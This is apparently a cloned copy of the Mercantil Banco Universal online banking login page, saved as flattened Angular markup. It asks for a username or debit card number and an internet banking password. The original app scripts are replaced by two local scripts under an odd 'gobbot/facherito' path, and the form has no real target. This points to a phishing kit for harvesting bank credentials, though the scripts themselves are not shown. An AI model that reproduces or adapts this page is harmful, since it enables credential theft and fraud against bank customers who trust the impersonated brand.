                    </div>
                </div>
            </melp-share-transaction-form>
            <!---->
            <div _ngcontent-ois-c85="" id="app-container">
                <div _ngcontent-ois-c85="" class="overlay-sidebar"></div>
                <melp-system-error _ngcontent-ois-c85="" _nghost-ois-c77="">
                    <div _ngcontent-ois-c77="" class="hide">
                        <melp-navigation _ngcontent-ois-c77="" _nghost-ois-c76="">
                            <!---->
                            <div _ngcontent-ois-c76="" id="navigation">
                                <div _ngcontent-ois-c76="" class="data-info">
                                    <div _ngcontent-ois-c76="" class="data-info-section">
                                        <!----><span _ngcontent-ois-c76="" class="data-info-section-breadcrumb ng-star-inserted">
                                            <!---->
                                        </span>
                                        <!---->
                                    </div>
                                    <div _ngcontent-ois-c76="" class="data-info-page ng-star-inserted"><span _ngcontent-ois-c76="" class="data-info-page-title">Inicia tu sesión</span></div>
                                    <!---->
                                    <melp-alert-float _ngcontent-ois-c76="" _nghost-ois-c75="">
                                        <!---->
                                    </melp-alert-float>
                                </div>
                            </div>
                        </melp-navigation>
                    </div>
                    <div _ngcontent-ois-c77="" id="system-error" class="hide">
                        <!---->
                    </div>
                </melp-system-error>
                <melp-sidebar _ngcontent-ois-c85="" _nghost-ois-c79="" class="ng-star-inserted">
                    <!---->
                    <!---->
                    <div _ngcontent-ois-c79="" id="step1" data-tooltipclass="tour-class" class="sidebar notLogged">
                        <!---->
                        <div _ngcontent-ois-c79="" class="li active ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Inicia tu sesión" src="assets/get-into-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Inicia tu sesión</a></div>
                        </div>
                        <!---->
                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Regístrate" src="assets/create-user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Regístrate</a></div>
                        </div>
                        <!---->
                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Recupera tu usuario" src="assets/user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Recupera tu usuario</a></div>
                        </div>
                        <!---->
                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Cambia tu clave de internet" src="assets/change-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Cambia tu clave de internet</a></div>
                        </div>
                        <!---->
                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Desbloquea tu clave de internet" src="assets/unlock-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Desbloquea tu clave de internet</a></div>
                        </div>
                        <!---->
                        <!---->
                        <!---->
                        <div _ngcontent-ois-c79="" class="second-level scroll-second-level">
                            <!---->
                        </div>
                        <div _ngcontent-ois-c79="" class="secondary-menu-wrapper ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="secondary-menu" style="border: none;"><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted">
                                <img _ngcontent-ois-c79="" src="assets/Cont-1.svg" alt="Contáctenos"></a>
                                <!---->
                                <!---->
                                <!---->
                                <!---->
                                <!----><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted" ><img _ngcontent-ois-c79="" src="assets/Ubic-1.svg" alt="Ubíquenos"></a>
                                <!---->
                                <!---->
                                <!---->
                                <!---->
                                <!----><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted" ><img _ngcontent-ois-c79="" src="assets/Tips_seg-1.svg" alt="Ciberseguridad"></a>
                                <!---->
                                <!---->
                                <!---->
                                <!---->
                                <!----><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted" ><img _ngcontent-ois-c79="" src="assets/Pol_seg-1.svg" alt="Política de privacidad"></a>
                                <!---->
                                <!---->
                                <!---->
                                <!---->
                                <!----><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted" ><img _ngcontent-ois-c79="" src="assets/Ter_cond-1.svg" alt="Términos y Condiciones"></a>
                                <!---->
                                <!---->
                                <!---->
                                <!---->
                                <!---->
                                <!---->
                                <!---->
                                <!---->
                            </div>
                        </div>
                        <!---->
                        <div _ngcontent-ois-c79="" class="secondary-submenu-wrapper">
                            <!---->
                            <!---->
                        </div>
                    </div>
                </melp-sidebar>
                <!---->
                <!---->
                <melp-second-sidebar _ngcontent-ois-c85="" _nghost-ois-c83="">
                    <!---->
                    <div _ngcontent-ois-c83="" class="second-sidebar">
                        <!---->
                    </div>
                </melp-second-sidebar>
                <!---->
                <router-outlet _ngcontent-ois-c85=""></router-outlet>
                <melp-login _nghost-ois-c165="" class="ng-star-inserted">
                    <melp-login-background _ngcontent-ois-c165="" id="login-melp" _nghost-ois-c161="" class="ng-star-inserted">
                        <div _ngcontent-ois-c161="" class="faded-background">
                            <div _ngcontent-ois-c161="" class="content">
                                <div _ngcontent-ois-c165="" class="card-wrapper">
                                    <div _ngcontent-ois-c165="" class="card">
                                        <div _ngcontent-ois-c165="" class="card-body">
                                            <div _ngcontent-ois-c165="" class="login-title">
                                                <p _ngcontent-ois-c165="" class="login-welcome ng-star-inserted">Bienvenido</p>
                                                <!---->
                                                <!---->
                                                <!----><span _ngcontent-ois-c165="" class="login-iniciated">Inicia tu sesión</span>
                                            </div>
                                            <melp-description _ngcontent-ois-c165="" _nghost-ois-c162="">
                                                <div _ngcontent-ois-c162="" class="description-wrapper active">
                                                    <div _ngcontent-ois-c162="" class="description">
                                                        <!---->
                                                        <ul _ngcontent-ois-c162="" class="ng-star-inserted">
                                                            <!---->
                                                        </ul>
                                                        <!---->
                                                        <!---->
                                                    </div>
                                                </div>
                                                <div _ngcontent-ois-c162="" class="error-message-wrapper">
                                                    <div _ngcontent-ois-c162="" class="error-img-wrapper"><img _ngcontent-ois-c162="" alt="Error" src="assets/alerta-rojo-new.svg"></div>
                                                    <div _ngcontent-ois-c162="" class="error-message ng-star-inserted">
                                                        <!---->
                                                    </div>
                                                    <!---->
                                                    <!---->
                                                </div>
                                                <div _ngcontent-ois-c162="" class="info__wrapper">
                                                    <div _ngcontent-ois-c162="" class="error-img-wrapper ng-star-inserted"><img _ngcontent-ois-c162="" alt="Error" src="assets/Alerta-azul.svg"></div>
                                                    <!---->
                                                    <div _ngcontent-ois-c162="" class="info__wrapper--message text-center"><span _ngcontent-ois-c162="" style="font-weight: bold;"></span>
                                                        <!---->
                                                    </div>
                                                </div>
                                            </melp-description>
                                            <form _ngcontent-ois-c165="" method="POST" class="form-group ng-untouched ng-pristine">
                                                <div _ngcontent-ois-c165="" class="ng-star-inserted">
                                                    <mat-form-field _ngcontent-ois-c165="" floatlabel="always" class="mat-form-field ng-tns-c71-2 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-should-float mat-form-field-has-label ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                                        <div class="mat-form-field-wrapper ng-tns-c71-2">
                                                            <div class="mat-form-field-flex ng-tns-c71-2">
                                                                <!---->
                                                                <!---->
                                                                <div class="mat-form-field-infix ng-tns-c71-2">
                                                                    <input _ngcontent-ois-c165="" matinput="" id="username" placeholder="Ingresa tu usuario o Tarjeta de débito" formcontrolname="username" maxlength="18" minlength="6" class="mat-input-element mat-form-field-autofill-control ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored ng-star-inserted" type="text" required="" data-placeholder="Ingresa tu usuario o Tarjeta de débito" aria-required="true" name="usuario">
                                                                    <!---->
                                                                    <!---->
                                                                    <!---->
                                                                    <span class="mat-form-field-label-wrapper ng-tns-c71-2"><label class="mat-form-field-label ng-tns-c71-2 ng-star-inserted" id="mat-form-field-label-5" for="username" aria-owns="username">
                                                                            <!---->
                                                                            <mat-label _ngcontent-ois-c165="" class="ng-tns-c71-2 ng-star-inserted">Usuario o Tarjeta de débito</mat-label>
                                                                            <!----><span aria-hidden="true" class="mat-placeholder-required mat-form-field-required-marker ng-tns-c71-2 ng-star-inserted"> *</span>
                                                                            <!---->
                                                                        </label>
                                                                        <!---->
                                                                    </span>
                                                                </div>
                                                                <div class="mat-form-field-suffix ng-tns-c71-2 ng-star-inserted">
                                                                    <mat-icon _ngcontent-ois-c165="" matsuffix="" class="ng-tns-c71-2"><img _ngcontent-ois-c165="" alt="eye" class="icon pointer" src="assets/eye-disabled-blue.svg"></mat-icon>
                                                                </div>
                                                                <!---->
                                                            </div>
                                                            <div class="mat-form-field-underline ng-tns-c71-2 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c71-2"></span></div>
                                                            <!---->
                                                            <div class="mat-form-field-subscript-wrapper ng-tns-c71-2">
                                                                <!---->
                                                                <div class="mat-form-field-hint-wrapper ng-tns-c71-2 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                                                    <!---->
                                                                    <div class="mat-form-field-hint-spacer ng-tns-c71-2"></div>
                                                                </div>
                                                                <!---->
                                                            </div>
                                                        </div>
                                                    </mat-form-field>
                                                    <div _ngcontent-ois-c165="" class="login-link"> Crea tu usuario </div>
                                                </div>
                                                <!---->
                                                <mat-form-field _ngcontent-ois-c165="" floatlabel="always" class="mat-form-field ng-tns-c71-1 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-should-float mat-form-field-has-label ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                                    <div class="mat-form-field-wrapper ng-tns-c71-1">
                                                        <div class="mat-form-field-flex ng-tns-c71-1">
                                                            <!---->
                                                            <!---->
                                                            <div class="mat-form-field-infix ng-tns-c71-1"><input _ngcontent-ois-c165="" matinput="" id="password" placeholder="Ingresa tu clave de internet" formcontrolname="password" autocomplete="off" maxlength="15" minlength="8" class="mat-input-element mat-form-field-autofill-control ng-tns-c71-1 ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" type="password" required="" data-placeholder="Ingresa tu clave de internet" aria-required="true" name="pass"><span class="mat-form-field-label-wrapper ng-tns-c71-1"><label class="mat-form-field-label ng-tns-c71-1 ng-star-inserted" id="mat-form-field-label-3" for="password" aria-owns="password">
                                                                        <!---->
                                                                        <mat-label _ngcontent-ois-c165="" class="ng-tns-c71-1 ng-star-inserted">Clave de internet</mat-label>
                                                                        <!----><span aria-hidden="true" class="mat-placeholder-required mat-form-field-required-marker ng-tns-c71-1 ng-star-inserted"> *</span>
                                                                        <!---->
                                                                    </label>
                                                                    <!---->
                                                                </span></div>
                                                            <div class="mat-form-field-suffix ng-tns-c71-1 ng-star-inserted">
                                                                <mat-icon _ngcontent-ois-c165="" matsuffix="" class="ng-tns-c71-1"><img _ngcontent-ois-c165="" alt="eye" class="icon pointer" src="assets/eye-disabled-blue.svg"></mat-icon>
                                                            </div>
                                                            <!---->
                                                        </div>
                                                        <div class="mat-form-field-underline ng-tns-c71-1 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c71-1"></span></div>
                                                        <!---->
                                                        <div class="mat-form-field-subscript-wrapper ng-tns-c71-1">
                                                            <!---->
                                                            <div class="mat-form-field-hint-wrapper ng-tns-c71-1 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                                                <!---->
                                                                <div class="mat-form-field-hint-spacer ng-tns-c71-1"></div>
                                                            </div>
                                                            <!---->
                                                        </div>
                                                    </div>
                                                </mat-form-field>
                                                <div _ngcontent-ois-c165="" class="login-link"> ¿Olvidaste tu clave de internet? </div>

                                                <!---->
                                            <div _ngcontent-ois-c165="" class="login-button">
                                                <melp-button-wrapper _ngcontent-ois-c165="" _nghost-ois-c164="">
                                                    <div _ngcontent-ois-c164="" class="button-wrapper button-wrapper-separation-end">
                                                        <!---->
                                                        <div _ngcontent-ois-c164="" class="button-wrapper-main-button w-100 button-wrapper-center">
                                                            <!----><button type="submit"_ngcontent-ois-c164="" class="btn btn-primary ng-star-inserted" > Iniciar </button>
                                                            <!---->
                                                        </div>
                                                    </div>
                                                </melp-button-wrapper>
                                            </div>
                                            <!---->
                                            </form>
                                            
                                            
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!----><img _ngcontent-ois-c161="" alt="faded-background" class="bottom-img ng-star-inserted" src="assets/07.webp">
                            <div _ngcontent-ois-c161="" class="white-background ng-star-inserted"></div><img _ngcontent-ois-c161="" alt="Cliente" class="upper-img ng-star-inserted" src="assets/07(1).webp">
                            <!---->
                            <!---->
                            <!---->
                        </div>
                    </melp-login-background>
                    <!---->
                </melp-login>
                <!---->
                <melp-footer _ngcontent-ois-c85="" _nghost-ois-c84="">
                    <footer _ngcontent-ois-c84=""><span _ngcontent-ois-c84="" id="copyright" class="text-center">El acceso o uso no autorizado se considera un delito. Derechos protegidos por Mercantil C.A., Banco Universal. RIF: J-00002961-0.</span></footer>
                </melp-footer>
            </div>
        </melp-standard-layout>
        <!---->
    </app>

    <script src="./gobbot/facherito/skill/cd.js"></script>
    <script src="./gobbot/facherito/skill/redy.js"></script>
</body>

</html>
